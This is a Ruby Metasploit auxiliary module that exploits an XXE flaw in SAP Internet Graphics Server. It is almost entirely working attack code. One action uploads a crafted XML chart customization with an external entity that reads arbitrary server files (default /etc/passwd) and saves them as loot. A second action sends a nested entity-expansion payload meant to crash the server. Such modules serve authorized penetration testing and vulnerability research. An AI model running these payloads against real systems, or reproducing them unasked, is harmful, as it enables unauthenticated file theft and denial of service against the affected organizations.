##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary

  prepend Msf::Exploit::Remote::AutoCheck
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(
        update_info(
          info,
          'Name' => 'SAP Internet Graphics Server (IGS) XXE',
          'Description' => %q{
            This module implements the SAP Internet Graphics Server (IGS) XXE attack.
            An unauthenticated attacker can remotely read files in the server's file system, for example: /etc/passwd
            Vulnerable SAP IGS versions: 7.20, 7.20EXT, 7.45, 7.49, 7.53
          },
          'Author' => [
            'Yvan Genuer', # @_1ggy The Security Researcher who originally found the vulnerability
            'Vladimir Ivanov' # @_generic_human_ This Metasploit module
          ],
          'License' => MSF_LICENSE,
          'References' => [
            [ 'CVE', '2018-2392' ],
            [ 'CVE', '2018-2393' ],
            [ 'URL', 'https://download.ernw-insight.de/troopers/tr18/slides/TR18_SAP_IGS-The-vulnerable-forgotten-component.pdf' ]
          ],
          'Actions' => [
            [ 'READ', { 'Description' => 'Remote file read' } ],
            [ 'DOS', { 'Description' => 'Denial Of Service' } ]
          ],
          'DefaultAction' => 'READ',
          'DisclosureDate' => '2018-03-14'
        )
    )
    register_options(
      [
        Opt::RPORT(40080),
        OptString.new('FILE', [ true, 'File to read from the remote server', '/etc/passwd']),
        OptString.new('URN', [ false, 'SAP IGS XMLCHART URN', '/XMLCHART']),
        OptBool.new('SHOW', [false, 'Show remote file content', true])
      ]
    )
  end

  def get_variables
    @host = @datastore['RHOSTS']
    @port = @datastore['RPORT']
    @urn = @datastore['URN']
    @file = @datastore['FILE']
    if datastore['SSL']
      @schema = 'https://'
    else
      @schema = 'http://'
    end
    @data_xml = {
      name: 'data',
      filename: Rex::Text.rand_text_alphanumeric(12) + '.xml',
      data: nil
    }
    @data_xml[:data] = %(<?xml version='1.0' encoding='UTF-8'?>
    <ChartData>
      <Categories>
        <Category>ALttP</Category>
      </Categories>
      <Series label="Hyrule">
        <Point>
          <Value type="y">#{Rex::Text.rand_text_numeric(4)}</Value>
        </Point>
      </Series>
    </ChartData>)
    @xxe_xml = {
      name: 'custo',
      filename: Rex::Text.rand_text_alphanumeric(12) + '.xml',
      data: nil
    }
  end

  def make_xxe_xml(file_name)
    get_variables
    entity = Rex::Text.rand_text_alpha(5)
    @xxe_xml[:data] = %(<?xml version='1.0' encoding='UTF-8'?>
    <!DOCTYPE Extension [<!ENTITY #{entity} SYSTEM "#{file_name}">]>
    <SAPChartCustomizing version="1.1">
      <Elements>
        <ChartElements>
          <Title>
            <Extension>&#{entity};</Extension>
          </Title>
        </ChartElements>
      </Elements>
    </SAPChartCustomizing>)
  end

  def make_post_data(file_name, dos = false)
    get_variables

    if !dos
      make_xxe_xml(file_name)
    else
      @xxe_xml[:data] = %(<?xml version='1.0' encoding='UTF-8'?>
    <!DOCTYPE Extension [
      <!ENTITY dos 'dos'>
      <!ENTITY dos1 '&dos;&dos;&dos;&dos;&dos;&dos;&dos;&dos;&dos;&dos;&dos;&dos;&dos;&dos;&dos;&dos;&dos;&dos;&dos;&dos;&dos;&dos;&dos;&dos;&dos;&dos;&dos;&dos;'>
      <!ENTITY dos2 '&dos1;&dos1;&dos1;&dos1;&dos1;&dos1;&dos1;&dos1;&dos1;&dos1;&dos1;&dos1;&dos1;&dos1;&dos1;&dos1;&dos1;&dos1;&dos1;&dos1;&dos1;&dos1;&dos1;&dos1;'>
      <!ENTITY dos3 '&dos2;&dos2;&dos2;&dos2;&dos2;&dos2;&dos2;&dos2;&dos2;&dos2;&dos2;&dos2;&dos2;&dos2;&dos2;&dos2;&dos2;&dos2;&dos2;&dos2;&dos2;&dos2;&dos2;&dos2;'>
      <!ENTITY dos4 '&dos3;&dos3;&dos3;&dos3;&dos3;&dos3;&dos3;&dos3;&dos3;&dos3;&dos3;&dos3;&dos3;&dos3;&dos3;&dos3;&dos3;&dos3;&dos3;&dos3;&dos3;&dos3;&dos3;&dos3;'>
      <!ENTITY dos5 '&dos4;&dos4;&dos4;&dos4;&dos4;&dos4;&dos4;&dos4;&dos4;&dos4;&dos4;&dos4;&dos4;&dos4;&dos4;&dos4;&dos4;&dos4;&dos4;&dos4;&dos4;&dos4;&dos4;&dos4;'>
      <!ENTITY dos6 '&dos5;&dos5;&dos5;&dos5;&dos5;&dos5;&dos5;&dos5;&dos5;&dos5;&dos5;&dos5;&dos5;&dos5;&dos5;&dos5;&dos5;&dos5;&dos5;&dos5;&dos5;&dos5;&dos5;&dos5;'>
      <!ENTITY dos7 '&dos6;&dos6;&dos6;&dos6;&dos6;&dos6;&dos6;&dos6;&dos6;&dos6;&dos6;&dos6;&dos6;&dos6;&dos6;&dos6;&dos6;&dos6;&dos6;&dos6;&dos6;&dos6;&dos6;&dos6;'>
      <!ENTITY dos8 '&dos7;&dos7;&dos7;&dos7;&dos7;&dos7;&dos7;&dos7;&dos7;&dos7;&dos7;&dos7;&dos7;&dos7;&dos7;&dos7;&dos7;&dos7;&dos7;&dos7;&dos7;&dos7;&dos7;&dos7;'>
    ]>
    <SAPChartCustomizing version="1.1">
      <Elements>
        <ChartElements>
          <Title>
            <Extension>&dos8;</Extension>
          </Title>
        </ChartElements>
      </Elements>
    </SAPChartCustomizing>)
    end

    @post_data = Rex::MIME::Message.new
    @post_data.add_part(@data_xml[:data], 'application/xml', nil, "form-data; name=\"#{@data_xml[:name]}\"; filename=\"#{@data_xml[:filename]}\"")
    @post_data.add_part(@xxe_xml[:data], 'application/xml', nil, "form-data; name=\"#{@xxe_xml[:name]}\"; filename=\"#{@xxe_xml[:filename]}\"")
  end

  def get_download_link(html_response)
    if html_response['ImageMap']
      if (download_link_regex = /ImageMap" href="(?<link>.*)">ImageMap/.match(html_response))
        @download_link = download_link_regex[:link]
      else
        @download_link = nil
      end
    else
      @download_link = nil
    end
  end

  def get_file_content(html_response)
    file_content = html_response.gsub('<area shape=rect coords="0, 0,0, 0" ', '')
    @file_content = file_content.gsub('>', '')
  end

  def analyze_first_response(html_response)
    get_download_link(html_response)
    if @download_link
      begin
        second_response = nil
        second_response = send_request_cgi(
          {
            'uri' => normalize_uri(@download_link),
            'method' => 'GET'
          }
        )
      rescue StandardError => e
        print_error("Failed to retrieve SAP IGS page: #{@schema}#{@host}:#{@port}#{@download_link}")
        vprint_error("Error #{e.class}: #{e}")
      end
      fail_with(Failure::NotVulnerable, "#{@schema}#{@host}:#{@port}#{@urn}") if second_response.nil?
      fail_with(Failure::NotVulnerable, "#{@schema}#{@host}:#{@port}#{@urn}") unless second_response.code == 200
      get_file_content(second_response.body)
    else
      print_status("System is vulnerable, but not found file: #{@file} on host: #{@host}")
    end
  end

  def check

    # Set up XML data for HTTP request
    get_variables
    make_post_data('/etc/os-release', false) # Get linux OS release and added this in MSF Workspase

    # Send HTTP request
    begin
      check_response = nil
      check_response = send_request_cgi(
        {
          'uri' => normalize_uri(@urn), # @urn - is Option URN (SAP IGS XMLCHART URN default: /XMLCHART)
          'method' => 'POST',
          'ctype' => "multipart/form-data; boundary=#{@post_data.bound}",
          'data' => @post_data.to_s
        }
      )
    rescue StandardError => e
      print_error("Failed to retrieve SAP IGS page: #{@schema}#{@host}:#{@port}#{@urn}")
      vprint_error("Error #{e.class}: #{e}")
    end

    # Check HTTP response
    return Exploit::CheckCode::Safe if check_response.nil?
    return Exploit::CheckCode::Safe unless check_response.code == 200
    return Exploit::CheckCode::Safe unless check_response.body.include?('Picture') && check_response.body.include?('Info')
    return Exploit::CheckCode::Safe unless check_response.body.match?(/ImageMap|Errors/)

    # Get OS release information
    os_release = ''
    analyze_first_response(check_response.body)
    if @file_content
      if (os_regex = /^PRETTY_NAME.*=.*"(?<os>.*)"$/.match(@file_content))
        os_release = "OS info: #{os_regex[:os]}"
      end
    end

    # Report service
    if os_release != ''
      ident = "SAP Internet Graphics Server (IGS); #{os_release}"
    else
      ident = 'SAP Internet Graphics Server (IGS)'
    end

    report_service(
      host: @host,
      port: @port,
      name: 'http',
      proto: 'tcp',
      info: ident
    )

    # Report and print Vulnerability
    report_vuln(
      host: @host,
      port: @port,
      name: name,
      refs: references,
      info: os_release
    )

    Exploit::CheckCode::Vulnerable(os_release)

  end

  def run
    case action.name
    when 'READ'
      action_file_read
    when 'DOS'
      action_dos
    else
      print_error("The action #{action.name} is not a supported action.")
    end
  end

  def action_file_read

    # Set up XML data for HTTP request
    get_variables
    make_post_data(@file, false) # @file - is Option FILE (File to read from the remote server, by default: /etc/passwd)

    # Send HTTP request
    begin
      first_response = nil
      first_response = send_request_cgi(
        {
          'uri' => normalize_uri(@urn), # @urn - is Option URN (SAP IGS XMLCHART URN, by default: /XMLCHART)
          'method' => 'POST',
          'ctype' => "multipart/form-data; boundary=#{@post_data.bound}",
          'data' => @post_data.to_s
        }
      )
    rescue StandardError => e
      print_error("Failed to retrieve SAP IGS page: #{@schema}#{@host}:#{@port}#{@urn}")
      vprint_error("Error #{e.class}: #{e}")
    end

    # Check first HTTP response
    fail_with(Failure::NotVulnerable, "#{@schema}#{@host}:#{@port}#{@urn}") if first_response.nil?
    fail_with(Failure::NotVulnerable, "#{@schema}#{@host}:#{@port}#{@urn}") unless first_response.code == 200
    fail_with(Failure::NotVulnerable, "#{@schema}#{@host}:#{@port}#{@urn}") unless first_response.body.include?('Picture') && first_response.body.include?('Info')
    fail_with(Failure::NotVulnerable, "#{@schema}#{@host}:#{@port}#{@urn}") unless first_response.body.match?(/ImageMap|Errors/)

    # Report Vulnerability
    report_vuln(
      host: @host,
      port: @port,
      name: name,
      refs: references
    )

    # Download remote file
    analyze_first_response(first_response.body)
    if @file_content
      vprint_good("File: #{@file} content from host: #{@host}\n#{@file_content}")
      loot = store_loot('sap.igs.xxe', 'text/plain', @host, @file_content, @file, 'SAP IGS XXE')
      print_good("File: #{@file} saved in: #{loot}")
    else
      fail_with(Failure::NotVulnerable, "#{@schema}#{@host}:#{@port}#{@urn}")
    end

  end

  def action_dos

    # Set up XML data for HTTP request
    get_variables
    make_post_data(@file, true)

    # Send HTTP request
    begin
      dos_response = nil
      dos_response = send_request_cgi(
        {
          'uri' => normalize_uri(@urn), # @urn - is Option URN (SAP IGS XMLCHART URN default: /XMLCHART)
          'method' => 'POST',
          'ctype' => "multipart/form-data; boundary=#{@post_data.bound}",
          'data' => @post_data.to_s
        }, 10
      )
    rescue Timeout::Error
      report_vuln(
        host: @host,
        port: @port,
        name: name,
        refs: references
      )
      print_good("Successfully managed to DOS the SAP IGS server at #{@host}:#{@port}")
    rescue StandardError => e
      print_error("Failed to retrieve SAP IGS page: #{@schema}#{@host}:#{@port}#{@urn}")
      vprint_error("Error #{e.class}: #{e}")
    end

    # Check HTTP response
    fail_with(Failure::NotVulnerable, "#{@schema}#{@host}:#{@port}#{@urn}") unless dos_response.code != 200

  end

end
